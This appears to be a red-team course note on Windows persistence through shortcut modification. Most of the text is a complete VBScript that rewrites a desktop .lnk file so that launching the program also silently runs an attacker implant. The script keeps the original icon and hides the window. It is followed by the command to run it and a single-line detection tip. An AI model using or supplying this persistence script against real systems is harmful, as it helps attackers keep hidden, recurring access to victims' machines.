# Shortcut Modification

#### The end user usually uses some form of shortcuts or links to run apps or access files/folders. these shortcuts can be modified to run attackers payload instead.

From attackers point of view these files are actually `.lnk` files stored in the Desktop directory for each user:

```
C:\Users\username\Desktop
```

we can't edit these files like a normal text file. we can use this VBA script to edit these files:

```vba
' CONFIGURATION
implant = "C:\RTO\PERS\implant\implant.exe"
newTarget = "C:\RTO\PERS\01.USER\putty.vbs"
lnkName = "putty.exe.lnk"

' helper vars
set WshShell = WScript.CreateObject("WScript.Shell" )
strDesktop = WshShell.SpecialFolders("Desktop" )
set oShellLink = WshShell.CreateShortcut(strDesktop & "\" & lnkName )
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory

' persistence implantation
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(newTarget,True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & implant & chr(34) & vbCrLf
File.Write "oShell.Run " & chr(34) & oShellLink.TargetPath & " " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close

oShellLink.TargetPath = newTarget
oShellLink.IconLocation = origTarget & ", 0"
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save
```

```
wscript c:\rto\PERS\01.USER\makelnk.vbs
```

#### this script will take the putty.lnk file (a link to putty executable file) from the desktop and modifies it to change the target path to run another VBA script that will run both the original putty.exe binary and the attacker payload.

## <mark style="color:red;">Detection</mark>

check all desktop links and shortcuts to make sure they are not modified.
